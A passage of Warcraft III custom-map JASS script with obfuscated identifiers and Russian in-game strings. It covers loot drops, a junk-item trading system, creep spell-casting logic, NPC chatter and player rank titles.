set Ou=CreateItem($49303841,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==9 then
set Ou=CreateItem($49303838,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==8 then
set Ou=CreateItem($49303837,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==7 then
set Ou=CreateItem($49303836,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==6 then
set Ou=CreateItem($49303842,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==5 then
set Ou=CreateItem($49303839,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
endif
elseif GetUnitTypeId(Ud)==$6E303248 or GetUnitTypeId(Ud)==$6E30324B then
if Np==5 then
set Ou=CreateItem($49303832,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==4 then
set Ou=CreateItem($49303835,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
endif
elseif GetUnitTypeId(Ud)==$6E30324D or GetUnitTypeId(Ud)==$6E30324A then
if Np==4 then
set Ou=CreateItem($49303844,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==5 then
set Ou=CreateItem($49303846,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==6 then
set Ou=CreateItem($49303849,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==7 then
set Ou=CreateItem($49303848,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
endif
endif
endif
set Ud=null
set Ue=null
call RemoveLocation(Uf)
set Uf=null
endfunction
function n3 takes nothing returns nothing
local trigger Uc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Uc,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(Uc,function n2)
set Uc=null
endfunction
function n4 takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local integer U4=GetUnitLevel(Hu)
local location Mc
local item No
if GetOwningPlayer(Hu)==Player(PLAYER_NEUTRAL_AGGRESSIVE) then
if GetRandomInt(1,50)==1 or true then
if U4<11 then
call nh(Hu,"Хлам",.023,200,200,200)
set Mc=GetUnitLoc(Hu)
if U4==1 then
set No=CreateItem($49305931,GetLocationX(Mc),GetLocationY(Mc))
call SetItemUserData(No,10)
endif
if U4==2 then
set No=CreateItem($49305932,GetLocationX(Mc),GetLocationY(Mc))
call SetItemUserData(No,10)
endif
if U4==3 then
set No=CreateItem($49305934,GetLocationX(Mc),GetLocationY(Mc))
call SetItemUserData(No,10)
endif
if U4==4 or U4==5 then
set No=CreateItem($49305935,GetLocationX(Mc),GetLocationY(Mc))
call SetItemUserData(No,10)
endif
if U4==6 or U4==7 then
set No=CreateItem($49305936,GetLocationX(Mc),GetLocationY(Mc))
call SetItemUserData(No,10)
endif
if U4==8 or U4==9 or U4==10 then
set No=CreateItem($49305943,GetLocationX(Mc),GetLocationY(Mc))
call SetItemUserData(No,10)
endif
set No=null
call RemoveLocation(Mc)
set Mc=null
endif
endif
endif
set Hu=null
endfunction
function n5 takes nothing returns nothing
local item MO=GetManipulatedItem()
local item U6
local unit Mc
local integer No
local integer Np
local integer Nt
local location Ny
if GetItemTypeId(MO)==$49305943 or GetItemTypeId(MO)==$49305936 or GetItemTypeId(MO)==$49305935 or GetItemTypeId(MO)==$49305934 or GetItemTypeId(MO)==$49305932 or GetItemTypeId(MO)==$49305931 then
set Mc=GetTriggerUnit()
set No=GetItemTypeId(MO)
set Np=0
set Nt=1
loop
if UnitHasItem(Mc,UnitItemInSlot(Mc,Nt))==true then
set Np=Np+1
endif
set Nt=Nt+1
exitwhen Nt>=6
endloop
if Np>=5 then
call ne(Mc,"Нет места",.023,255,100,100)
set Ny=GetUnitLoc(Mc)
set U6=CreateItem(No,GetLocationX(Ny),GetLocationY(Ny))
call SetItemUserData(U6,10)
call RemoveLocation(Ny)
set Ny=null
else
if GetItemTypeId(MO)==$49305931 then
if nO(Mc,$49303854) then
call SetItemCharges(nP(Mc,$49303854),GetItemCharges(nP(Mc,$49303854))+10)
else
call nQ($49303854,Mc)
endif
elseif GetItemTypeId(MO)==$49305932 then
if nO(Mc,$49303856) then
call SetItemCharges(nP(Mc,$49303856),GetItemCharges(nP(Mc,$49303856))+10)
else
call nQ($49303856,Mc)
endif
elseif GetItemTypeId(MO)==$49305934 then
if nO(Mc,$49304C44) then
call SetItemCharges(nP(Mc,$49304C44),GetItemCharges(nP(Mc,$49304C44))+10)
else
call nQ($49304C44,Mc)
endif
elseif GetItemTypeId(MO)==$49305935 then
if nO(Mc,$49305549) then
call SetItemCharges(nP(Mc,$49305549),GetItemCharges(nP(Mc,$49305549))+10)
else
call nQ($49305549,Mc)
endif
elseif GetItemTypeId(MO)==$49305936 then
if nO(Mc,$49303855) then
call SetItemCharges(nP(Mc,$49303855),GetItemCharges(nP(Mc,$49303855))+10)
else
call nQ($49303855,Mc)
endif
elseif GetItemTypeId(MO)==$49305943 then
if nO(Mc,$4930554B) then
call SetItemCharges(nP(Mc,$4930554B),GetItemCharges(nP(Mc,$4930554B))+10)
else
call nQ($4930554B,Mc)
endif
endif
endif
set Mc=null
endif
set U6=null
set MO=null
endfunction
function n6 takes nothing returns nothing
local unit NR=GetTriggerUnit()
local unit NE=GetOrderTargetUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local integer U8
local integer Mc
local integer No
local integer Np
local integer Nt
if GetUnitTypeId(NE)==$6E65677A then
if DistanceBetweenPoints(GetUnitLoc(NR),GetUnitLoc(NE))<=200. then
if nO(NR,$49303854) then
set U8=GetItemCharges(nP(NR,$49303854))
call RemoveItem(nP(NR,$49303854))
set Mc=GetRandomInt(10,50)*U8
set No=GetRandomInt(1,5)*U8
set Np=GetRandomInt(40,100)*U8
set Nt=GetRandomInt(1,10)
call ne(NR,"+|c00ffff00"+I2S(Mc)+"G |c00ff9696"+I2S(No)+"B |c00ff00ff"+I2S(Np)+"EXP",.023,255,255,255)
set NJ[Ma+1]=NJ[Ma+1]+Mc*3
set NK[Ma+1]=NK[Ma+1]+No*3
call AddHeroXP(MT[GetPlayerId(GetOwningPlayer(NR))],Np,false)
if Nt<=U8 then
set NF=false
call nQ($49305832,NR)
set NF=true
call ne(NR,"|c00ff7f00Отличная сделка|r",.023,255,255,255)
endif
endif
if nO(NR,$49303856) then
set U8=GetItemCharges(nP(NR,$49303856))
call RemoveItem(nP(NR,$49303856))
set Mc=GetRandomInt(15,50)*U8
set No=GetRandomInt(1,7)*U8
set Np=GetRandomInt(50,110)*U8
set Nt=GetRandomInt(1,11)
set NJ[Ma+1]=NJ[Ma+1]+Mc*3
set NK[Ma+1]=NK[Ma+1]+No*3
call AddHeroXP(MT[GetPlayerId(GetOwningPlayer(NR))],Np,false)
call ne(NR,"+|c00ffff00"+I2S(Mc)+"G |c00ff9696"+I2S(No)+"B |c00ff00ff"+I2S(Np)+"EXP",.023,255,255,255)
if Nt<=U8 then
set NF=false
call nQ($49305831,NR)
set NF=true
call ne(NR,"|c00ff7f00Отличная сделка|r",.023,255,255,255)
endif
endif
if nO(NR,$49304C44) then
set U8=GetItemCharges(nP(NR,$49304C44))
call RemoveItem(nP(NR,$49304C44))
set Mc=GetRandomInt(20,70)*U8
set No=GetRandomInt(2,8)*U8
set Np=GetRandomInt(60,130)*U8
set Nt=GetRandomInt(1,12)
set NJ[Ma+1]=NJ[Ma+1]+Mc*3
set NK[Ma+1]=NK[Ma+1]+No*3
call AddHeroXP(MT[GetPlayerId(GetOwningPlayer(NR))],Np,false)
call ne(NR,"+|c00ffff00"+I2S(Mc)+"G |c00ff9696"+I2S(No)+"B |c00ff00ff"+I2S(Np)+"EXP",.023,255,255,255)
if Nt<=U8 then
set NF=false
call nQ($49305758,NR)
set NF=true
call ne(NR,"|c00ff7f00Отличная сделка|r",.023,255,255,255)
endif
endif
if nO(NR,$49305549) then
set U8=GetItemCharges(nP(NR,$49305549))
call RemoveItem(nP(NR,$49305549))
set Mc=GetRandomInt(30,80)*U8
set No=GetRandomInt(2,10)*U8
set Np=GetRandomInt(80,150)*U8
set Nt=GetRandomInt(1,13)
set NJ[Ma+1]=NJ[Ma+1]+Mc*3
set NK[Ma+1]=NK[Ma+1]+No*3
call AddHeroXP(MT[GetPlayerId(GetOwningPlayer(NR))],Np,false)
call ne(NR,"+|c00ffff00"+I2S(Mc)+"G |c00ff9696"+I2S(No)+"B |c00ff00ff"+I2S(Np)+"EXP",.023,255,255,255)
if Nt<=U8 then
set NF=false
call nQ($4930575A,NR)
set NF=true
call ne(NR,"|c00ff7f00Отличная сделка|r",.023,255,255,255)
endif
endif
if nO(NR,$49303855) then
set U8=GetItemCharges(nP(NR,$49303855))
call RemoveItem(nP(NR,$49303855))
set Mc=GetRandomInt(40,90)*U8
set No=GetRandomInt(3,13)*U8
set Np=GetRandomInt(100,180)*U8
set Nt=GetRandomInt(1,14)
set NJ[Ma+1]=NJ[Ma+1]+Mc*3
set NK[Ma+1]=NK[Ma+1]+No*3
call AddHeroXP(MT[GetPlayerId(GetOwningPlayer(NR))],Np,false)
call ne(NR,"+|c00ffff00"+I2S(Mc)+"G |c00ff9696"+I2S(No)+"B |c00ff00ff"+I2S(Np)+"EXP",.023,255,255,255)
if Nt<=U8 then
set NF=false
call nQ($49305830,NR)
set NF=true
call ne(NR,"|c00ff7f00Отличная сделка|r",.023,255,255,255)
endif
endif
if nO(NR,$4930554B) then
set U8=GetItemCharges(nP(NR,$4930554B))
call RemoveItem(nP(NR,$4930554B))
set Mc=GetRandomInt(50,100)*U8
set No=GetRandomInt(4,14)*U8
set Np=GetRandomInt(130,200)*U8
set Nt=GetRandomInt(1,15)
set NJ[Ma+1]=NJ[Ma+1]+Mc*3
set NK[Ma+1]=NK[Ma+1]+No*3
call AddHeroXP(MT[GetPlayerId(GetOwningPlayer(NR))],Np,false)
call ne(NR,"+|c00ffff00"+I2S(Mc)+"G |c00ff9696"+I2S(No)+"B |c00ff00ff"+I2S(Np)+"EXP",.023,255,255,255)
if Nt<=U8 then
set NF=false
call nQ($49305759,NR)
set NF=true
call ne(NR,"|c00ff7f00Отличная сделка|r",.023,255,255,255)
endif
endif
endif
endif
set NR=null
set NE=null
endfunction
function n7 takes nothing returns nothing
local trigger U3=CreateTrigger()
local trigger U5
local trigger U7
call TriggerRegisterAnyUnitEventBJ(U3,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(U3,function n4)
set U5=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(U5,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(U5,function n5)
set U3=null
set U5=null
set U7=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(U7,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(U7,function n6)
set U7=null
endfunction
function n8 takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local item MO=GetManipulatedItem()
local location Ht
if RectContainsUnit(Bn,Hu)==true then
if GetItemTypeId(MO)==$49303547 then
set Ht=Location(-14190,-5300)
call CreateUnitAtLoc(Player(10),$65303041,Ht,0)
call RemoveItem(MO)
elseif GetItemTypeId(MO)==$49303548 then
set Ht=Location(-14190,-5300)
call CreateUnitAtLoc(Player(10),$65303039,Ht,0)
call RemoveItem(MO)
elseif GetItemTypeId(MO)==$49303549 then
set Ht=Location(-14190,-5300)
call CreateUnitAtLoc(Player(10),$65303038,Ht,0)
call RemoveItem(MO)
endif
elseif RectContainsUnit(Bo,Hu)==true then
if GetItemTypeId(MO)==$49303547 then
set Ht=Location(-5900,-14480)
call CreateUnitAtLoc(Player(10),$6E303244,Ht,0)
call RemoveItem(MO)
elseif GetItemTypeId(MO)==$49303548 then
set Ht=Location(-5900,-14480)
call CreateUnitAtLoc(Player(10),$6E303243,Ht,0)
call RemoveItem(MO)
elseif GetItemTypeId(MO)==$49303549 then
set Ht=Location(-5900,-14480)
call CreateUnitAtLoc(Player(10),$6E303242,Ht,0)
call RemoveItem(MO)
endif
elseif RectContainsUnit(Bp,Hu)==true then
if GetItemTypeId(MO)==$49303547 then
set Ht=Location(590,-4800)
call CreateUnitAtLoc(Player(10),$6E303247,Ht,0)
call RemoveItem(MO)
elseif GetItemTypeId(MO)==$49303548 then
set Ht=Location(590,-4800)
call CreateUnitAtLoc(Player(10),$6E303246,Ht,0)
call RemoveItem(MO)
elseif GetItemTypeId(MO)==$49303549 then
set Ht=Location(590,-4800)
call CreateUnitAtLoc(Player(10),$6E303245,Ht,0)
call RemoveItem(MO)
endif
elseif RectContainsUnit(EE,Hu)==true then
if GetItemTypeId(MO)==$49303547 then
set Ht=Location(9300,-5530)
call CreateUnitAtLoc(Player(10),$6E303550,Ht,0)
call RemoveItem(MO)
elseif GetItemTypeId(MO)==$49303548 then
set Ht=Location(9300,-5530)
call CreateUnitAtLoc(Player(10),$6E30354E,Ht,0)
call RemoveItem(MO)
elseif GetItemTypeId(MO)==$49303549 then
set Ht=Location(9300,-5530)
call CreateUnitAtLoc(Player(10),$6E30354F,Ht,0)
call RemoveItem(MO)
endif
endif
call RemoveLocation(Ht)
set Ht=null
set Hu=null
set MO=null
endfunction
function n9 takes nothing returns nothing
set U9=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(U9,EVENT_PLAYER_UNIT_USE_ITEM)
call TriggerAddAction(U9,function n8)
endfunction
function oB takes unit Hu,unit Ne,integer VC,string VD,string PQ,string VE,string VF,string VG,string VH,string VI,string VJ returns nothing
local integer Mc
local location No
if GetUnitTypeId(Hu)==VC then
set Mc=GetRandomInt(1,3)
if Mc==1 and VD!="s1" then
call IssueTargetOrder(Hu,VD,Ne)
elseif Mc==2 and PQ!="s2" then
call IssueTargetOrder(Hu,PQ,Ne)
elseif Mc==3 and VE!="s3" then
call IssueTargetOrder(Hu,VE,Hu)
endif
call TriggerSleepAction(.5)
set Mc=GetRandomInt(1,3)
if Mc==1 and VF!="s4" then
set No=GetUnitLoc(Ne)
call IssuePointOrderLoc(Hu,VF,No)
call RemoveLocation(No)
elseif Mc==2 and VG!="s5" then
set No=GetUnitLoc(Ne)
call IssuePointOrderLoc(Hu,VG,No)
call RemoveLocation(No)
elseif Mc==3 and VH!="s6" then
set No=GetUnitLoc(Hu)
call IssuePointOrderLoc(Hu,VH,No)
call RemoveLocation(No)
endif
call TriggerSleepAction(.5)
set Mc=GetRandomInt(1,2)
if Mc==1 and VI!="s7" then
call IssueImmediateOrder(Hu,VI)
elseif Mc==2 and VJ!="s8" then
call IssueImmediateOrder(Hu,VJ)
endif
set No=null
endif
endfunction
function oC takes nothing returns nothing
local unit VB
local unit NR
call DisableTrigger(GetTriggeringTrigger())
set VB=GetTriggerUnit()
set NR=GetAttacker()
call oB(VB,NR,$68303141,"faeriefire","banish","s3","carrionswarm","carrionswarm","carrionswarm","s7","s8")
call oB(VB,NR,$6E303338,"s1","s2","s3","dreadlordinferno","dreadlordinferno","s6","roar","roar")
call oB(VB,NR,$6E303259,"cripple","cripple","s3","rainoffire","rainoffire","s6","s7","s8")
call oB(VB,NR,$75303052,"s1","s2","s3","rainoffire","rainoffire","s6","starfall","starfall")
call oB(VB,NR,$6E303330,"deathcoil","deathcoil","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303232,"s1","s2","s3","s4","s5","s6","avatar","avatar")
call oB(VB,NR,$6E736E70,"cripple","creepthunderbolt","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303353,"sleep","manaburn","unholyfrenzy","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303156,"forkedlightning","forkedlightning","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303230,"acidbomb","sleep","s3","s4","s5","s6","avatar","avatar")
call oB(VB,NR,$6E303554,"acidbomb","s2","s3","impale","impale","s6","s7","s8")
call oB(VB,NR,$6E30324F,"frostnova","forkedlightning","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E30324F,"acidbomb","s2","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E687963,"thunderbolt","frostnova","rejuvination","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E687963,"manaburn","cripple","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$68303238,"s1","s2","s3","breathoffire","breathoffire","s6","s7","s8")
call oB(VB,NR,$6E30305A,"s1","s2","s3","carrionswarm","carrionswarm","s6","s7","s8")
call oB(VB,NR,$65303049,"s1","s2","s3","breathoffire","breathoffrost","s6","s7","s8")
call oB(VB,NR,$6E303045,"s1","s2","s3","breathoffire","breathoffire","s6","s7","s8")
call oB(VB,NR,$6E303044,"shadowstrike","shadowstrike","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303250,"soulburn","soulburn","s3","dreadlordinferno","dreadlordinferno","s6","howlofterror","howlofterror")
call oB(VB,NR,$6E30304C,"s1","s2","s3","breathoffrost","breathoffrost","s6","s7","s8")
call oB(VB,NR,$6E30304D,"s1","s2","rejuvination","monsoon","s5","s6","s7","s8")
call oB(VB,NR,$6E30304E,"s1","s2","s3","carrionswarm","carrionswarm","s6","s7","s8")
call oB(VB,NR,$6E303758,"s1","s2","s3","carrionswarm","carrionswarm","s6","s7","s8")
call oB(VB,NR,$756E6563,"hex","soulburn","s3","ward","flamestrike","breathoffire","s7","s8")
call oB(VB,NR,$6E30304B,"s1","s2","s3","flamestrike","flamestrike","breathoffire","s7","s8")
call oB(VB,NR,$6E30324E,"creepthunderbolt","creepthunderbolt","s3","breathoffrost","carrionswarm","breathoffire","s7","s8")
call oB(VB,NR,$6830324F,"chainlightning","chainlightning","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303445,"chainlightning","chainlightning","s3","s4","s5","s6","fanofknives","fanofknives")
call oB(VB,NR,$6E303258,"chainlightning","chainlightning","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303331,"chainlightning","chainlightning","s3","s4","s5","breathoffire","whirlwind","whirlwind")
call oB(VB,NR,$6E303654,"chainlightning","creepthunderbolt","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E30304F,"chainlightning","fanofknives","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303232,"chainlightning","chainlightning","s3","s4","s5","s6","avatar","avatar")
call oB(VB,NR,$6E627A64,"chainlightning","creepthunderbolt","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E627A6B,"chainlightning","chainlightning","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303553,"chainlightning","manaburn","polymorph","silence","silence","s6","s7","s8")
call oB(VB,NR,$6E30304A,"forkedlightning","manaburn","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6830344F,"manaburn","manaburn","s3","clusterrockets","clusterrockets","s6","s7","s8")
call oB(VB,NR,$6E303057,"forkedlightning","forkedlightning","rejuvination","stampede","stampede","silence","s7","s8")
call oB(VB,NR,$6E303051,"faeriefire","faeriefire","s3","s4","s5","s6","mirrorimage","mirrorimage")
call oB(VB,NR,$6E737277,"s1","s2","s3","stasistrap","stasistrap","s6","waterelemental","waterelemental")
call oB(VB,NR,$6E6A6762,"s1","s2","s3","s4","s5","s6","waterelemental","waterelemental")
call oB(VB,NR,$68303548,"s1","s2","s3","s4","s5","s6","fanofknives","fanofknives")
call oB(VB,NR,$6E30364C,"s1","s2","s3","s4","s5","s6","howlofterror","waterelemental")
call oB(VB,NR,$6E30364E,"s1","s2","s3","s4","s5","s6","waterelemental","howlofterror")
call oB(VB,NR,$6E30364D,"s1","s2","s3","s4","s5","s6","waterelemental","howlofterror")
call oB(VB,NR,$68303554,"s1","s2","s3","s4","s5","s6","fanofknives","waterelemental")
call oB(VB,NR,$6E30325A,"s1","s2","s3","s4","s5","s6","howlofterror","howlofterror")
call oB(VB,NR,$6E303155,"hex","curse","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303157,"s1","s2","s3","s4","s5","s6","howlofterror","howlofterror")
call oB(VB,NR,$75303035,"drain","cripple","s3","s4","s5","s6","s7","locustswarm")
call oB(VB,NR,$75303032,"cripple","drain","s3","carrionswarm","carrionswarm","s6","s7","s8")
call oB(VB,NR,$75303034,"drain","cripple","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303052,"curse","curse","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303252,"entanglingroots","entanglingroots","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$7530304C,"soulburn","soulburn","s3","s4","s5","s6","fanofknives","fanofknives")
call oB(VB,NR,$6E303157,"s1","s2","s3","s4","s5","s6","howlofterror","howlofterror")
call oB(VB,NR,$7530304A,"curse","curse","s3","s4","s5","s6","howlofterror","howlofterror")
call oB(VB,NR,$6E303433,"s1","s2","s3","carrionswarm","carrionswarm","s6","bloodlust","mirrorimage")
call oB(VB,NR,$6E303048,"banish","banish","s3","blizzard","blizzard","s6","s7","s8")
call oB(VB,NR,$6E303334,"s1","s2","antimagicshell","carrionswarm","carrionswarm","s6","s7","s8")
call oB(VB,NR,$6E726472,"creepthunderbolt","creepthunderbolt","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$75303030,"creepthunderbolt","creepthunderbolt","s3","silence","silence","s6","s7","s8")
call oB(VB,NR,$75303054,"creepthunderbolt","creepthunderbolt","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303159,"s1","s2","s3","s4","s5","s6","starfall","starfall")
call oB(VB,NR,$6E303844,"creepthunderbolt","polymorph","s3","s4","s5","s6","fanofknives","fanofknives")
call oB(VB,NR,$6E303233,"s1","s2","s3","s4","s5","s6","starfall","starfall")
call oB(VB,NR,$6E303356,"tornado","tornado","s3","blizzard","blizzard","s6","s7","s8")
call oB(VB,NR,$6E303339,"s1","s2","lightningshield","s4","s5","s6","fanofknives","fanofknives")
call oB(VB,NR,$75303049,"s1","s2","s3","dreadlordinferno","dreadlordinferno","dreadlordinferno","s7","s8")
call oB(VB,NR,$6E303555,"s1","s2","s3","s4","s5","s6","avatar","avatar")
call oB(VB,NR,$6E303130,"drain","drain","s3","s4","s5","s6","s7","s8")
call oB(VB,NR,$6E303754,"s1","s2","s3","s4","s5","carrionswarm","avatar","avatar")
set VB=null
set NR=null
call TriggerSleepAction(2)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function oD takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddAction(Hc,function oC)
set Hc=null
endfunction
function oE takes nothing returns nothing
call SetUnitInvulnerable(GetEnumUnit(),false)
endfunction
function oF takes nothing returns nothing
local integer L9=GetRandomInt(0,9999)
local integer Pd=GetRandomInt(0,9999)
local integer Pe=GetRandomInt(0,9999)
call PreloadGenClear()
call Preload(I2S(L9+Pd+Pe))
call PreloadGenEnd("Errors\\"+I2S(L9+Pd+Pe)+".sav")
endfunction
function oG takes nothing returns nothing
call SetUnitInvulnerable(GetEnumUnit(),true)
endfunction
function oH takes nothing returns nothing
local integer L9=GetRandomInt(1,10)
local integer Pd=GetRandomInt(1,10)
local integer Pe=GetRandomInt(1,10)
local texttag NX=CreateTextTag()
if L9==1 then
call IssuePointOrderLoc(Kq,"move",Location(-14730.,481.))
elseif L9==2 then
call IssuePointOrderLoc(Kq,"move",Location(-12868.,2361.))
elseif L9==3 then
call IssuePointOrderLoc(Kq,"move",Location(-13090.,437.))
elseif L9==4 then
call IssuePointOrderLoc(Kq,"move",Location(-12204.,-734.))
endif
if Pd==1 then
call IssuePointOrderLoc(Jf,"move",Location(-12204.,-734.))
elseif Pd==2 then
call IssuePointOrderLoc(Jf,"move",Location(-13621.,2378.))
elseif Pd==3 then
call IssuePointOrderLoc(Jf,"move",Location(-15773.,-1180.))
elseif Pd==4 then
call IssuePointOrderLoc(Jf,"move",Location(-13035.,681.))
endif
if Pe==1 then
call IssuePointOrderLoc(KN,"move",Location(-13833.,2235.))
elseif Pe==2 then
call IssuePointOrderLoc(KN,"move",Location(-11403.,-844.))
elseif Pe==3 then
call IssuePointOrderLoc(KN,"move",Location(-13438.,-531.))
elseif Pe==4 then
call IssuePointOrderLoc(KN,"move",Location(-14769.,-1177.))
endif
if L9==5 then
call nh(Kr,"|cFF0080FFКакая красивая статуя",.028,255,255,255)
elseif L9==6 then
call nh(Kr,"|cFF0080FFПросто блеск, мне бы такую домой",.028,255,255,255)
endif
if Pd==5 then
call nh(Km,"|cFF0080FFСлышали, что вчера Антонидос рассказывал?",.028,255,255,255)
elseif Pd==6 then
call nh(Km,"|cFF0080FFОй, девчёнки...",.028,255,255,255)
endif
if Pe==5 then
call nh(Kh,"|cFF0080FFМне вчера такую красивую сумочку подарили",.028,255,255,255)
elseif Pe==6 then
call nh(Kh,"|cFF0080FFКак вы думаете, бросит ли жена нашего Капитана?",.028,255,255,255)
elseif Pe==7 then
call nh(Kh,"|cFF0080FFСкучно нынче жить, никто не воюет...",.028,255,255,255)
endif
if L9==7 then
call nh(KO,"|cFF0080FFДетишки, жизнь - страшная штука",.028,255,255,255)
elseif L9==8 then
call nh(KO,"|cFF0080FFНе бегайте!",.028,255,255,255)
elseif L9==9 then
call nh(KO,"|cFF0080FFбла, бла...",.028,255,255,255)
endif
if Pd==7 then
call nh(KL,"|cFF0080FFЯ хочу играть!",.028,255,255,255)
elseif Pd==8 then
call nh(KL,"|cFF0080FFМам, эта статуя точно такая же, как и на том берегу!",.028,255,255,255)
endif
endfunction
function oI takes nothing returns nothing
local integer L9=1
local location Mc
local location No
local location Np
local integer Nt
call SetUnitState(Ki,UNIT_STATE_LIFE,GetUnitState(Ki,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,5)*.01)
loop
set Mc=GetUnitLoc(MT[L9-1])
set No=GetUnitLoc(NL[L9*2])
set Np=GetUnitLoc(Nc[L9])
if nT(Mc,No)>=550 then
call SetUnitPositionLoc(NL[L9*2],Mc)
else
if nT(Mc,No)>=400 then
call IssuePointOrder(NL[L9*2],"smart",GetLocationX(Mc),GetLocationY(Mc))
endif
endif
if nT(Mc,Np)>=550 then
call SetUnitPositionLoc(Nc[L9],Mc)
else
if nT(Mc,Np)>=400 then
call IssuePointOrder(Nc[L9],"smart",GetLocationX(Mc),GetLocationY(Mc))
endif
endif
call SetPlayerState(Player(L9-1),PLAYER_STATE_FOOD_CAP_CEILING,1)
call SetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_FOOD_USED,1)
call SetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_FOOD_CAP,1)
call RemoveLocation(Mc)
call RemoveLocation(No)
call RemoveLocation(Np)
set Mc=null
set No=null
set Np=null
if Ts[L9]==true then
call SetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_GOLD,NJ[L9]/3)
call SetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER,NK[L9]/3)
if NJ[L9]>450000 then
set NJ[L9]=450000
endif
if NK[L9]>30000 then
set NK[L9]=30000
endif
if GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_GOLD)>NJ[L9]/3 then
if GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>NK[L9]/3 then
call SetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_GOLD,NJ[L9]/3)
call SetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER,NK[L9]/3)
endif
endif
endif
if GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=7000 then
set VN[L9]="|c007d7d7dВластелин|r (|c00ffff0021|r)"
set TE[L9]=21
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=6200 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=6999 then
set VN[L9]="Легенда (|c00ffff0020|r)"
set TE[L9]=20
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=5700 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=6199 then
set VN[L9]="Идеал нашей эпохи (|c00ffff0019|r)"
set TE[L9]=19
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=5200 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=5699 then
set TE[L9]=18
set VN[L9]="Топовый Задрот (|c00ffff0018|r)"
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=4700 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=5199 then
set VN[L9]="Почетный Задрот (|c00ffff0017|r)"
set TE[L9]=17
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=4200 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=4699 then
set VN[L9]="СверхМастер (|c00ffff0016|r)"
set TE[L9]=16
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=3700 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=4199 then
set VN[L9]="Великий Мастер (|c00ffff0015|r)"
set TE[L9]=15
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=3200 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=3699 then
set TE[L9]=14
set VN[L9]="Мастер (|c00ffff0014|r)"
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=2700 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=3199 then
set TE[L9]=13
set VN[L9]="Капитан Мэлерота (|c00ffff0013|r)"
